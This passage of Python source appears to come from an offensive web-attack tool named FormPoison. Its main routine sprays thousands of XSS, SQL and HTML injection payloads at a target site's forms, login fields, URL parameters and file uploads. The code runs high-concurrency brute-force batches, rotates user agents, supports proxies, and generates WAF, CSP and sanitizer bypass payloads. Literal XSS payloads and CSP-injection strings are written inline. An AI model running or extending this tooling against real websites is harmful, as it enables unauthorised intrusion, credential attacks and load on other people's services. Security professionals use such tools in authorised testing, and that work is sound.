                    console.print(f"[red]Error after {max_retries + 1} attempts: {str(e)[:80]}[/red]")
                    return {
                        "user_config": field_values,
                        "poison_fields": poison_fields,
                        "payload_used": "ERROR",
                        "user_agent": current_user_agent,
                        "response_code": 405 if "405" in str(e) else 0,
                        "reflected": False,
                        "vulnerabilities": [f"Request Failed: {str(e)}"],
                        "execution_indicators": [],
                        "request_data": {},
                        "method_used": current_method
                    }

    if poison_fields and payloads:
        console.print(f"\n[bold green]Testing {len(payloads)} payloads on {len(poison_fields)} poison fields[/bold green]")

        if brute_mode:
            all_payload_indices = list(range(len(payloads)))
            total_batches = (len(all_payload_indices) + batch_size - 1) // batch_size

            for batch_num in range(total_batches):
                start_idx = batch_num * batch_size
                end_idx = min(start_idx + batch_size, len(all_payload_indices))
                batch_indices = all_payload_indices[start_idx:end_idx]

                console.print(f"[dim]Batch {batch_num + 1}/{total_batches} ({len(batch_indices)} requests)[/dim]")
                
                batch_tasks = [test_with_user_config(idx) for idx in batch_indices]
                batch_results = await asyncio.gather(*batch_tasks, return_exceptions=True)
                
                for result in batch_results:
                    if isinstance(result, dict):
                        results.append(result)

                if batch_num < total_batches - 1 and batch_delay > 0:
                    await asyncio.sleep(batch_delay)

            if connector:
                await connector.close()

        else:
            for i in range(len(payloads)):
                result = await test_with_user_config(i)
                results.append(result)

                if secs > 0:
                    await asyncio.sleep(secs)
    else:
        console.print("\n[bold yellow]Testing with user configuration (single request)[/bold yellow]")
        result = await test_with_user_config()
        results.append(result)

    total_tests = len(results)
    reflected_count = sum(1 for r in results if r.get('reflected'))
    xss_executed_count = sum(1 for r in results if 'XSS_EXECUTED' in r.get('execution_indicators', []))
    error_405_count = sum(1 for r in results if r.get('response_code') == 405)
    
    console.print(f"\n[bold green]Interactive Testing Completed: {total_tests} requests[/bold green]")
    console.print(f"[yellow]Reflected: {reflected_count}/{total_tests}[/yellow]")
    console.print(f"[bold red]XSS Executed: {xss_executed_count}/{total_tests}[/bold red]")
    if error_405_count > 0:
        console.print(f"[bold yellow]405 Errors: {error_405_count}/{total_tests} (Method Not Allowed)[/bold yellow]")

    with open("interactive_test_results.json", "w") as f:
        json.dump({
            "parameters": {
                "interactive_mode": True,
                "user_field_config": field_values,
                "poison_fields": poison_fields,
                "brute_mode": brute_mode,
                "method_used": method
            },
            "results": results
        }, f, indent=4)

    console.print(f"[bold green]Interactive test results saved to 'interactive_test_results.json'[/bold green]")

    return results

async def main():
    parser = argparse.ArgumentParser(description="Over 3500 payloads included!")
    parser.add_argument("url", help="Form URL")
    parser.add_argument("--no-banner", action="store_true", help="Skip banner animation on startup")
    parser.add_argument("--interactive", action="store_true", help="Interactive mode - more control over injections.")
    parser.add_argument("--check", "-qs", action="store_true", help="Quick scan mode - perform FormAtion analysis before testing")
    parser.add_argument("--scan", action="store_true", help="Perform a quick scan of the website")
    parser.add_argument("--max-urls", type=int, default=100, help="Maximum number of URLs to scan (default: 100)")
    parser.add_argument("--max-depth", type=int, default=3, help="Maximum depth of scanning (default: 3)")
    parser.add_argument("--workers", type=int, default=10, help="Number of workers for scanning (default: 10)")
    parser.add_argument("--auto-target", action="store_true", 
                   help="Automatically generate and use targeted payloads based on Go scanner results")
    parser.add_argument("-t", "--threat", choices=["HTML", "Java", "SQL"], help="Threat type to test (HTML, Java, SQL)")
    parser.add_argument("-p", "--payloads", default="payloads.json", help="JSON file with payloads")
    parser.add_argument("--cookies", help="Cookies: 'key1=value1; key2=value2'")
    parser.add_argument("-ua","--user-agent", help="Specify User-Agent: 'random' for shuffling, or specific agent")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://login:password@proxy.com)")
    parser.add_argument("--ssl-cert", help="Path to SSL certificate file")
    parser.add_argument("--ssl-key", help="Path to SSL private key file")
    parser.add_argument("--ssl-verify", action="store_true", help="Verify SSL certificate (default: False)")
    parser.add_argument("--mXSS", action="store_true", help="Test Mutation XSS vulnerabilities")
    parser.add_argument('--brute', action='store_true', help='Brute force mode - maximum speed')
    parser.add_argument('--concurrent', type=int, default=50, help='Max concurrent requests (default: 50)')
    parser.add_argument('--timeout', type=float, default=15.0, help='Request timeout in seconds (default: 15)')
    parser.add_argument('--batch-size', type=int, default=100, help='Requests per batch (default: 100)')
    parser.add_argument('--batch-delay', type=float, default=1.0, help='Delay between batches in seconds (default: 1)')
    parser.add_argument('--retries', type=int, default=2, help='Max retries on failure (default: 2)')
    parser.add_argument("--method", default="POST", choices=["GET", "POST", "PUT", "DELETE"], help="HTTP method (default: POST)")
    parser.add_argument("--filter", help="Filter payloads by patterns (e.g., '<script>, onclick')")
    parser.add_argument("--login", action="store_true", help="Enable login testing for login and password fields")
    parser.add_argument("--verbose", action="store_true", help="Enable verbose mode")
    parser.add_argument("--verbose-all", action="store_true", help="Enable verbose mode with response content")
    parser.add_argument("--fieldname", help="Specific input field name to test")
    parser.add_argument("--filemode", action="store_true", help="Test filename XSS in file upload forms")
    parser.add_argument("-s", "--seconds", type=float, default=0, help="Delay between requests in seconds")
    parser.add_argument("--waf-bypass", action="store_true", help="Generate WAF bypass payloads")
    parser.add_argument("--csp-bypass", action="store_true", help="Generate CSP bypass payloads")
    parser.add_argument("--sanitizer-bypass", action="store_true", help="Generate HTML sanitizer bypass payloads")
    parser.add_argument("--encoder-bypass", action="store_true", help="Generate encoder bypass payloads")
    parser.add_argument("--encoding-confusion", action="store_true", help="Generate encoding confusion payloads")
    parser.add_argument("--size-overflow", action="store_true", help="Generate size overflow payloads")
    parser.add_argument("--url-param", action="store_true", help="Analyze and test URL parameters")
    parser.add_argument("--url-param-name", type=str, help="Specific URL parameter to target")
    parser.add_argument("--csp-directive", type=str, default="script-src-elem", help="CSP directive to inject")
    parser.add_argument("--csp-value", type=str, default="'unsafe-inline'", help="CSP value to inject")
    
    if len(sys.argv) == 1:
        console.print("[bold red]Enter valid command[/bold red]")
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    if not args.no_banner:
        show_banner()
    else:
        console.print("[dim]FormPoison v.1.0.1[/dim]")
    
    default_user_agent = "FormPoison/v.1.0.1"
    cookies = parse_cookies(args.cookies) if args.cookies else {}
    proxies = parse_proxy(args.proxy) if args.proxy else None
    user_agents = [default_user_agent]
    shuffle_user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0",
    ]

    if args.brute:
        console.print("[bold yellow]BRUTE FORCE MODE ACTIVATED[/bold yellow]")

    if not args.url.startswith(('http://', 'https://')):
        response = console.input(f"Switch to https://{args.url}? (Y/n): ")
        if response.lower() in ('yes', 'y', ''):
            args.url = f'https://{args.url}'
            console.print(f"[bold green]Switched to HTTPS: {args.url}[/bold green]")

    bypass_flags = {
        'waf_bypass': args.waf_bypass,
        'csp_bypass': args.csp_bypass,
        'sanitizer_bypass': args.sanitizer_bypass,
        'encoder_bypass': args.encoder_bypass,
        'encoding_confusion': args.encoding_confusion,
        'size_overflow': args.size_overflow
    }

    payloads = []

    # ============ GO SCANNER - DEEP ANALYSIS ============
    if args.scan:
        console.print("[bold blue]Running Go scanner for deep vulnerability analysis...[/bold blue]")
        scan_report, attack_recommendations = go_scanner.scan_and_analyze(
            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
        )

        if scan_report:
            base_payloads = load_payloads(args.payloads, {})
            targeted_payloads = go_scanner.generate_context_aware_payloads(
                scan_report, base_payloads, bypass_flags
            )
            
            with open("targeted_payloads.json", "w") as f:
                json.dump(targeted_payloads, f, indent=2)
                
            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads[/green]")
            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
            
            if attack_recommendations:
                console.print("[bold green]Attack recommendations:[/bold green]")
                for rec in attack_recommendations[:10]:
                    console.print(f"[yellow]- {rec}[/yellow]")
                
                response = console.input("[yellow]Proceed with targeted testing? (Y/n): [/yellow]")
                if response.lower() in ('', 'y', 'yes'):
                    payloads = targeted_payloads
                else:
                    console.print("[yellow]Skipping targeted testing[/yellow]")
                    payloads = load_payloads(args.payloads, bypass_flags)
        else:
            console.print("[red]Scan failed, using standard payloads[/red]")
            payloads = load_payloads(args.payloads, bypass_flags)

    # ============ AUTO TARGET MODE ============
    elif args.auto_target:
        console.print("[bold blue]AUTO-TARGET MODE ACTIVATED[/bold blue]")
        console.print("[bold blue]Running Go scanner for targeted vulnerability analysis...[/bold blue]")
        scan_report, _ = go_scanner.scan_and_analyze(
            args.url, args.max_urls, args.max_depth, args.workers, args.proxy
        )

        if scan_report:
            base_payloads = load_payloads(args.payloads, bypass_flags)
            targeted_payloads = go_scanner.generate_context_aware_payloads(scan_report, base_payloads)
            
            with open("targeted_payloads.json", "w") as f:
                json.dump(targeted_payloads, f, indent=2)
                    
            console.print(f"[green]Generated {len(targeted_payloads)} targeted payloads[/green]")
            console.print(f"[green]Saved to: targeted_payloads.json[/green]")
            
            payloads = targeted_payloads
            
            console.print("[bold green]Starting automated targeted testing...[/bold green]")
            await automated_targeted_testing(
                args.url, targeted_payloads, scan_report, cookies, user_agents,
                proxies=proxies, ssl_cert=args.ssl_cert, ssl_key=args.ssl_key, 
                ssl_verify=args.ssl_verify, brute_mode=args.brute,
                max_concurrent=args.concurrent, timeout=args.timeout
            )
            return
        else:
            console.print("[red]Scan failed, falling back to standard payloads[/red]")
            payloads = load_payloads(args.payloads, bypass_flags)

    # ============ LOAD PAYLOADS ============
    if not payloads:
        payloads = load_payloads(args.payloads, bypass_flags, args.url if args.url_param else None)

    if args.filter:
        filter_patterns = [pattern.strip() for pattern in args.filter.split(",")]
        payloads = filter_payloads(payloads, filter_patterns)
        console.print(f"[bold green]Filtered payloads: {len(payloads)} remaining[/bold green]")

    if args.threat:
        payloads = [p for p in payloads if p['category'] == args.threat]
        console.print(f"[bold green]Filtered for threat type: {args.threat} ({len(payloads)} payloads)[/bold green]")

    if args.user_agent:
        if args.user_agent.lower() == 'random':
            user_agents = shuffle_user_agents
            random.shuffle(user_agents)
            console.print(f"[bold green]Using random User Agent[/bold green]")
        else:
            user_agents = [args.user_agent]

    # ============ CHECK MODE ============
    if args.check:
        try:
            console.print("[bold blue]Running FormAtion analysis...[/bold blue]")
            try:
                formation_analyzer = FormAtionAnalyzer(args.url, args.user_agent, proxies)
                await formation_analyzer.analyze_site()
                console.print("[green]FormAtion analysis completed[/green]")
            except NameError:
                console.print("[yellow]FormAtionAnalyzer not available, running basic scan...[/yellow]")
                await scan(args.url, proxies)
            
            only_check = not any([
                args.scan, args.auto_target, args.interactive, 
                args.fieldname, args.login, args.mXSS, args.filemode,
                args.threat, args.brute, args.url_param, args.csp_bypass
            ])
            
            if only_check:
                console.print("\n[bold yellow]Analysis complete.[/bold yellow]")
                return
        except Exception as e:
            console.print(f"[red]Error during analysis: {e}[/red]")

    # ============ CSP PARAMETER BYPASS ============
    if args.csp_bypass and '?' in args.url:
        parsed = urlparse(args.url)
        params = parse_qs(parsed.query)
        
        if len(params) >= 2:
            console.print("[bold blue]CSP Parameter Bypass Mode (PortSwigger technique)[/bold blue]")
            console.print(f"[yellow]Detected {len(params)} URL parameters: {', '.join(params.keys())}[/yellow]")
            
            xss_payloads = [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "<body onload=alert(1)>",
                "\"><script>alert(1)</script>",
            ]
            
            for p in payloads:
                if p.get('category') in ['HTML', 'XSS']:
                    xss_payloads.append(p['inputField'])
            
            csp_bypass_payloads = [
                "script-src-elem 'unsafe-inline'",
                "script-src 'unsafe-inline'",
                "script-src-attr 'unsafe-inline'",
                "default-src 'unsafe-inline'",
                "script-src *",
                "script-src-elem *",
            ]
            
            if args.csp_directive and args.csp_value:
                csp_bypass_payloads.insert(0, f"{args.csp_directive} {args.csp_value}")
            
            csp_results = await test_csp_parameter_bypass(
                args.url, xss_payloads, csp_bypass_payloads,
                cookies, user_agents, proxies, args.ssl_verify,
                args.verbose or args.verbose_all, args.brute,
                args.concurrent, args.timeout, args.batch_size, args.batch_delay
            )
            
            if csp_results:
                with open("csp_bypass_results.json", "w") as f:
                    json.dump({
                        'url': args.url,
                        'results': csp_results,
                        'successful': len([r for r in csp_results if r.get('attack_successful')]),
                        'timestamp': time.time()
                    }, f, indent=2)
                console.print("[green]CSP bypass results saved to csp_bypass_results.json[/green]")
        else:
            console.print("[yellow]CSP parameter bypass requires at least 2 URL parameters[/yellow]")
            console.print("[yellow]Example: https://target.com/page?search=X&token=Y[/yellow]")

    # ============ URL PARAMETER TESTING ============
    elif args.url_param:
        console.print("[bold blue]Analyzing URL parameters...[/bold blue]")
        
        url_analysis = url_analyzer.analyze_url(args.url)
        
        if args.verbose:
            url_analyzer.display_analysis(url_analysis)
        
        url_results = await test_url_parameters(
            args.url, payloads, cookies, user_agents,
            proxies, args.ssl_verify, args.verbose or args.verbose_all,
            args.brute, args.concurrent, args.timeout, args.batch_size, args.batch_delay
        )
        
        if url_results:
            with open("url_parameter_results.json", "w") as f:
                json.dump({'url': args.url, 'results': url_results, 'timestamp': time.time()}, f, indent=2)
            console.print("[green]Results saved to url_parameter_results.json[/green]")

    # ============ INTERACTIVE MODE ============
    if args.interactive:
        console.print("[bold blue]INTERACTIVE MODE[/bold blue]")
        
        test_methods = ['GET', 'POST']
        page_content = None
        working_method = args.method
        
        for test_method in test_methods:
            console.print(f"[dim]Trying {test_method} request...[/dim]")
            for current_user_agent in user_agents:
                try:
                    headers = {'User-Agent': sanitize_user_agent(current_user_agent)}
                    ssl_context = ssl.create_default_context()
                    if args.ssl_cert and args.ssl_key:
                        ssl_context.load_cert_chain(args.ssl_cert, args.ssl_key)
                    
                    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                        if test_method == 'GET':
                            async with session.get(args.url, headers=headers, 
                                                 proxy=proxies.get('http') if proxies else None,
                                                 ssl=args.ssl_verify) as response:
                                if response.status != 405:
                                    page_content = await response.text()
                                    working_method = 'GET'
                                    break
                        else:
                            async with session.post(args.url, headers=headers,
                                                  proxy=proxies.get('http') if proxies else None,
                                                  ssl=args.ssl_verify) as response:
                                if response.status != 405:
                                    page_content = await response.text()
                                    working_method = 'POST'
                                    break
                except:
                    continue
            if page_content:
                break
        
        if not page_content:
            console.print("[bold red]Failed to fetch page content with any method.[/bold red]")
            return

        console.print(f"[green]Successfully connected using {working_method}[/green]")

        input_fields = get_string_input_fields(page_content)
        
        if not input_fields:
            console.print("[bold yellow]No input fields found.[/bold yellow]")
            return
            
        console.print(f"[bold green]{len(input_fields)} input fields found[/bold green]")
        
        await interactive_injection_mode(
            args.url, payloads, cookies, user_agents, working_method,
            proxies, args.ssl_cert, args.ssl_key, args.ssl_verify,
            args.verbose, args.verbose_all, args.seconds,
            brute_mode=args.brute, max_concurrent=args.concurrent,
            timeout=args.timeout, batch_size=args.batch_size,
            batch_delay=args.batch_delay, max_retries=args.retries
        )
        return

    # ============ STANDARD FORM TESTING ============
    page_content = None
    for current_user_agent in user_agents:
        page_content = await get_page_content(args.url, current_user_agent, proxies, args.ssl_cert, args.ssl_key, args.ssl_verify)
        if page_content:
            break

    if not page_content:
        console.print("[bold red]Failed to fetch page content.[/bold red]")
        sys.exit()

    input_fields = get_string_input_fields(page_content)
    console.print(f"[bold green]{len(input_fields)} input fields found[/bold green]")

    if args.filemode:
        console.print("[bold blue]Testing Filename XSS[/bold blue]")
        await test_filename_xss(args.url, input_fields, cookies, user_agents, proxies, args.ssl_verify)

    if args.mXSS:
        console.print("[bold blue]Testing Mutation XSS[/bold blue]")
        await test_mutation_xss(
            args.url, input_fields, cookies, user_agents,
            args.method, proxies, args.ssl_cert, args.ssl_key,
            args.ssl_verify, args.verbose, args.verbose_all,
            args.seconds, payload_filters=args.filter
        )

    if args.fieldname:
        field_found = False
        for f in input_fields:
            if args.fieldname.lower() in f.get('name', '').lower() or args.fieldname.lower() in f.get('id', '').lower():
                field_found = True
                console.print(f"[bold yellow]Testing field: {args.fieldname}[/bold yellow]")
                break
        if not field_found:
            console.print(f"[bold red]Field '{args.fieldname}' not found[/bold red]")

    if args.login:
        console.print(f"[bold green]Testing login fields[/bold green]")
        await test_login_input_fields(
            args.url, payloads, cookies, user_agents, input_fields,
            proxies, args.verbose, args.verbose_all, args.seconds, args.filter,
            brute_mode=args.brute, max_concurrent=args.concurrent,
            timeout=args.timeout, batch_size=args.batch_size,
            batch_delay=args.batch_delay, max_retries=args.retries
        )

    # Default: test all forms
    if not args.interactive:
        console.print(f"[bold green]Testing all forms with {len(payloads)} payloads[/bold green]")
        await test_all_forms(
            args.url, payloads, args.threat, cookies, user_agents,
            args.method, proxies, args.ssl_cert, args.ssl_key, args.filter,
            args.ssl_verify, args.verbose, args.verbose_all, args.seconds,
            brute_mode=args.brute, max_concurrent=args.concurrent,
            timeout=args.timeout, batch_size=args.batch_size,
            batch_delay=args.batch_delay, max_retries=args.retries
        )


if __name__ == "__main__":
    asyncio.run(main())
